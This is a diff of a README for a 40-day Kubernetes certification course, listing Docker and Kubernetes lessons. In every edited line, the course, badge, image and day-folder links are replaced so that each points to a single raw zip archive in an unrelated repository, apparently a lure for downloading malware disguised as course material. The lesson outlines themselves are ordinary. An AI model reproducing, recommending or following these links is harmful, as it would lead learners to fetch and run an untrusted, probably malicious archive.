@@ -4,17 +4,17 @@ This is the GitHub repository to host all the notes, diagrams, assignments, and 
 
 Note: If you found the content helpful, consider giving the repository a star ⭐
 
-**Checkout this [file](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip%https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) for the #40daysofkubernetes challenge details**
+**Checkout this [file](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip%https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) for the #40daysofkubernetes challenge details**
 
 ## 🔗 Join our community 👇
 
 
-<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip" height="60px"></img></a>
-<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip" height="60px"></img></a>
-<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip" height="60px"></img></a>
-<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip" height="60px"></img></a>
-<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip" height="60px"></img></a>
-<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip" height="60px"></img></a>
+<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip" height="60px"></img></a>
+<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip" height="60px"></img></a>
+<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip" height="60px"></img></a>
+<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip" height="60px"></img></a>
+<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip" height="60px"></img></a>
+<a href="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip"><img src="https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip" height="60px"></img></a>
 
 ## 🏆 #40daysofkubernetes Challenge - COMPLETED! 
 
@@ -42,14 +42,14 @@ Congratulations to all the amazing participants who dedicated their time and eff
 A huge thanks to everyone who participated, shared their learning journey, and contributed to building this amazing community! 🙏
 
 ### Day0: Intro to the series
-[![Course Introduction](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip)](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip)
+[![Course Introduction](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip)](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip)
 - Course Introduction
 - Discord community server for assistance
 - Live QnA sessions every weekend
 - #40daysofkubernetes challenge
 
 ### Day 1: Docker Fundamentals
-**Status**: Video is live, check out 👉 [Day1](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day1](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 - What is Docker?
 - How is it different from Virtual Machines
@@ -58,32 +58,32 @@ A huge thanks to everyone who participated, shared their learning journey, and c
 -  Docker commands
     
 ### Day 2 Video: Dockerize an application
-**Status**: Video is live, check out 👉 [Day2](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day2](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - What is Dockerfile, and how do you write it?
 - docker pull , push, tag etc
 
 ## Day3 Video: Docker Multi-Stage Builds
-**Status**: Video is live, check out 👉 [Day3](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day3](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - How to write a dockerfile for multistage build
 - Benefits of multi-stage builds
 - Other docker best practices
 
 ## Day 4 Video: Why do We need Kubernetes?
-**Status**: Video is live, check out 👉 [Day4](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day4](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 ## Day 5 Video: Kubernetes Architecture
-**Status**: Video is live, check out 👉 [Day5](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day5](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - Control plane VS Worker Nodes
 - Overview of control plane components
 
 ## Day 6 Video: Install Kubernetes Cluster locally
-**Status**: Video is live, check out 👉 [Day6](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day6](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 - Install Kind cluster locally
 - How to access the cluster
 
 ## Day7 Video: Pods in Kubernetes
-**Status**: Video is live, check out 👉 [Day7](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day7](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - What are pods in Kubernetes?
 - Containers VS Pods
 - Imperative VS Declarative way for creating Kubernetes resources
@@ -92,7 +92,7 @@ A huge thanks to everyone who participated, shared their learning journey, and c
 - Inspect the pods
 
 ## Day8 Video: Replicasets and Deployments in Kubernetes:
-**Status**: Video is live, check out 👉 [Day8](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day8](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - Replication Controller
 - ReplicaSet
 - Deployments
@@ -100,49 +100,49 @@ A huge thanks to everyone who participated, shared their learning journey, and c
 - Scale the deployment
 
 ## Day9 Video: Services in Kubernetes:
-**Status**: Video is live, check out 👉 [Day9](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day9](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - What are services in Kubernetes, and why do we need them?
 - Node port, ClusterIP, and LoadBalancer
 
 ## Day 10 Video: Namespaces:
-**Status**: Video is live, check out 👉 [Day10](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day10](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - NameSpaces
 - Services and namespaces
 
 
 ## Day 11 Video: Multi-container Pods
-**Status**: Video is live, check out 👉 [Day11](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day11](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - What are multi-container pods
 - Multi-container pods pattern - sidecar/init etc
 - Environment variables in Kubernetes
 
 
 ## Day 12 Video: Daemonset, Cronjob, and job
-**Status**: Video is live, check out 👉 [Day12](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day12](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - What are Daemonset, cronjobs and Jobs
 - Cron fundamentals with examples
 
 
 ## Day13 Video: Static Pods
-**Status**: Video is live, check out 👉 [Day13](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day13](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - What are static pods
 - Labels and selectors
 - Manual Scheduling
 
 
 ## Day14 Video: Taints and Tolerations
-**Status**: Video is live, check out 👉 [Day14](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day14](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 ## Day15 Video: Node Affinity
-**Status**: Video is live, check out 👉 [Day15](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day15](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 
 ## Day16 Video: Resource Requests and Limits
-**Status**: Video is live, check out 👉 [Day16](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day16](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 
 ## Day17 Video: Autoscaling in Kubernetes
-**Status**: Video is live, check out 👉 [Day17](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day17](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 - Horizontal VS Vertical Autoscaling
 - HPA, VPA, Cluster autoscaling, NAP
@@ -150,68 +150,68 @@ A huge thanks to everyone who participated, shared their learning journey, and c
 
 
 ## Day18 Video: Probes in Kubernetes
-**Status**: Video is live, check out 👉 [Day18](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day18](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - Liveness VS Readiness Probes
 - HTTP/TCP/Command-based health checks
 
 
 ## Day19 Video: Config maps and Secrets
-**Status**: Video is live, check out 👉 [Day19](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day19](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - concept and demo
   
 ## Day 20 Video: How SSL/TLS works
-**Status**: Video is live, check out 👉 [Day20](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day20](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - Symmetric VS Asymmetric encryption
 - SSL certificates and Certificate Authority
 
 ## Day 21 Video: TLS in Kubernetes
-**Status**: Video is live, check out 👉 [Day21](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day21](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - How TLS works in Kubernetes
 - Why we need TLS in Kubernetes
 - Private key and public certificates
 
 
 ## Day 22 Video: Authorization in Kubernetes
-**Status**: Video is live, check out 👉 [Day22](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day22](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - Authorization VS Authentication
 - Authorization types, ABAC, RBAC, Node, Webhook
 - Kubeconfig
 
 ## Day 23 Video: Role-based access control (RBAC)
-**Status**: Video is live, check out 👉 [Day23](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day23](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 - Role and role binding
 - Generate and approve the certificate
 - grant access to the user
 
 
 ## Day 24 Video: Cluster role and cluster role binding
-**Status**: Video is live, check out 👉 [Day24](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day24](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 - concept and demo
 
 ## Day 25 Video: Service Account
-**Status**: Video is live, check out 👉 [Day25](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day25](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 - What are service accounts, and why do we use them?
 - Create a service account and grant access to it
 
 
 ## Day26 Video: Network Policies
-**Status**: Video is live, check out 👉 [Day26](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day26](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 - Network policy concept
 - CNI installation
 - enforce network policy by creating the object
   
 ## Day27 Video: Use Kubeadm to install a Kubernetes cluster
-**Status**: Video is live, check out 👉 [Day27](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day27](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 - Provision underlying infrastructure to deploy a Kubernetes cluster
 - Setup Master Node to deploy Kubernetes components
 - Setup multiple worker nodes and join the master node
 
 ## Day28 Video: Docker storage fundamentals
-**Status**: Video is live, check out 👉 [Day28](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day36/CK-v1.3.zip) 👈 folder for notes and useful links ✅
+**Status**: Video is live, check out 👉 [Day28](https://raw.githubusercontent.com/shr1324/CKA-2024/main/Resources/Day14/CK_2.5.zip) 👈 folder for notes and useful links ✅
 
 - Why do we need storage in docker containers
 - persistent docker storage
